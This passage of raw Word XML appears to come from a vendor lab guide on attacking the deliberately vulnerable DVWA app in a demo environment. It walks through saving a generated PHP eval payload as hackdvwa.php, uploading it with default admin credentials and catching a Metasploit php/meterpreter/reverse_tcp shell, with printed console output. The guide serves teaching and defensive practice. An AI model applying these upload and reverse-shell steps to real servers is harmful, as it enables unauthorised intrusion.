      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; eval($b); die();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D10AA9" w14:textId="7FA2C924" w:rsidR="00744A8B" w:rsidRDefault="00547D35">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Highlight the section of code that was generated – from the “/*&lt;?php” to the end “die;”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42141815" w14:textId="77777777" w:rsidR="00744A8B" w:rsidRDefault="00744A8B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Open a Command prompt on the Windows PC.  In the command prompt type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B996C2B" w14:textId="77777777" w:rsidR="00744A8B" w:rsidRDefault="00744A8B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>CD Desktop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673CD364" w14:textId="77777777" w:rsidR="00744A8B" w:rsidRDefault="00744A8B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Notepad </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hackdvwa.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="646D1981" w14:textId="5401357E" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EC18FC4" wp14:editId="6E9E6796">
            <wp:extent cx="3794125" cy="1171366"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1542957485" name="Picture 154295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848" b="51820"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3794426" cy="1171459"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="724FC7B6" w14:textId="7DB9ABC7" w:rsidR="00744A8B" w:rsidRDefault="00744A8B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>In Notepad, paste the copied code and Save and Close the file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FFEC53" w14:textId="05D4AD97" w:rsidR="00FB4F2F" w:rsidRDefault="00FB4F2F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4B1428C3" wp14:editId="187AB190">
            <wp:extent cx="4818955" cy="2372995"/>
            <wp:effectExtent l="0" t="0" r="1270" b="8255"/>
            <wp:docPr id="1542957486" name="Picture 154295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46"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4818955" cy="2372995"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="68224073" w14:textId="1DD195D8" w:rsidR="00547D35" w:rsidRDefault="00744A8B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Open a Web Browser and go to </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidRPr="00AB130D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://dvwa.vlab.f5demo.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6E4083" w14:textId="72B84FE4" w:rsidR="00744A8B" w:rsidRDefault="00744A8B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Log in with admin / password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DDCDC6" w14:textId="103CCC99" w:rsidR="00D4629D" w:rsidRDefault="00D4629D">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Choose the Upload menu on the lower left</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0781C8E6" w14:textId="77777777" w:rsidR="00D4629D" w:rsidRDefault="00D4629D">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29C7B1BA" w14:textId="19128E49" w:rsidR="00744A8B" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="493E1857" wp14:editId="0B488A53">
            <wp:extent cx="4855210" cy="4108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210" cy="4108450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E94BFA" w14:textId="0D76D3C8" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click ‘Choose File’ and select the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hackdvwa.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file you just created on the Desk</w:t>
      </w:r>
      <w:r w:rsidR="0001315B">
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>op and click ‘Upload’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD4ED67" w14:textId="4616EBBB" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="633A454C" wp14:editId="317E2F6D">
            <wp:extent cx="4855210" cy="3324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5210" cy="3324860"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="785E3A33" w14:textId="50D04723" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64AA1EAB" wp14:editId="6D677084">
            <wp:extent cx="4369025" cy="19686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9025" cy="1968601"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F94D96" w14:textId="62B4777B" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>The file is then posted to the server and the location is displayed for you as a means of confirmation.</w:t>
      </w:r>
      <w:r w:rsidR="00F72EDE">
        <w:t xml:space="preserve">  You can copy this and paste it at the end of the URL in the browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B3FD53" w14:textId="4E2C3FF9" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the browser, visit that file’s location: </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidRPr="00AB130D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://dvwa.vlab.f5demo.com/hackable/uploads/hackdvwa.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="69DF9428" w14:textId="72EAC4F1" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">This will actually </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>fail</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and you should see a “no socket” message, but we’ll set that up next.  </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="16020D89" w14:textId="1C63BD23" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Back to the Kali ssh sessio</w:t>
      </w:r>
      <w:r w:rsidR="001677BA">
        <w:t>n we will set up the server to connect to from the web server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395B9665" w14:textId="12EAE444" w:rsidR="0001315B" w:rsidRDefault="0001315B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you’re not within </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> anymore, start it:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235E0C7A" w14:textId="10025BE2" w:rsidR="001677BA" w:rsidRDefault="001677BA" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="458BA3F3" w14:textId="2B657439" w:rsidR="0001315B" w:rsidRPr="0001315B" w:rsidRDefault="0001315B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now we want to choose an exploit to run.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA7EBB7" w14:textId="663A0F9B" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>use exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C75A9C3" w14:textId="33458F5E" w:rsidR="0001315B" w:rsidRDefault="0001315B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>To see what is selected for this exploit by default, type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E99DC9F" w14:textId="32B4A578" w:rsidR="0001315B" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5F69D7" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Module options (exploit/multi/handler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6C5331" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC062D5" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>Name  Current</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> Setting  Required  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329C4BAA" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   ----  ---------------  --------  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310F7AC5" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39E5B261" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BF912C6" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Exploit target:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D52001B" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DDB0545" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>Id  Name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4665EC67" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   --  ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573CB6D9" w14:textId="4F2AF812" w:rsidR="0001315B" w:rsidRPr="00FB4F2F" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00FB4F2F">
        <w:t xml:space="preserve">   0   Wildcard Target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6DE7AD" w14:textId="15A31F35" w:rsidR="001677BA" w:rsidRPr="00655A98" w:rsidRDefault="001677BA">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>this selects the exploit we’ll run in Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD0FC58" w14:textId="43B7CB33" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>set payload php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7CFB39EB" w14:textId="32054E67" w:rsidR="0001315B" w:rsidRDefault="0001315B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>To see the options for this payload, type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3DBF28" w14:textId="77777777" w:rsidR="0001315B" w:rsidRDefault="0001315B" w:rsidP="0001315B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A45B217" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Module options (exploit/multi/handler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECDCEDC" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="288591BC" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>Name  Current</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> Setting  Required  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27349B89" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   ----  ---------------  --------  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283FA020" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BEEBECC" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="011A636B" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Payload options (php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C64A209" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BA92CE1" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   Name   Current </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>Setting  Required</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542B919F" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   ----   ---------------  --------  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267E7188" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   LHOST                   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>yes</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">       The listen address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD6300B" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   LPORT  4444             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>yes</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">       The listen port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FDF455" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23932EA8" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6071AB56" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Exploit target:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C6E6F3" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0096B08D" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>Id  Name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2FFFD482" w14:textId="77777777" w:rsidR="0001315B" w:rsidRPr="00526315" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">   --  ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691572AA" w14:textId="04885D6B" w:rsidR="0001315B" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00FB4F2F">
        <w:t xml:space="preserve">   0   Wildcard Target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2D4DE4" w14:textId="37DB09D8" w:rsidR="001677BA" w:rsidRDefault="001677BA">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This chooses the actual payload we’re going to send through the exploit and we’ll set some parameters.  To see the </w:t>
      </w:r>
      <w:r w:rsidR="00FE32DF">
        <w:t>options</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F009235" w14:textId="357EA3F7" w:rsidR="001677BA" w:rsidRDefault="001677BA" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">show </w:t>
      </w:r>
      <w:r w:rsidR="00FE32DF">
        <w:t>options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AA4098" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
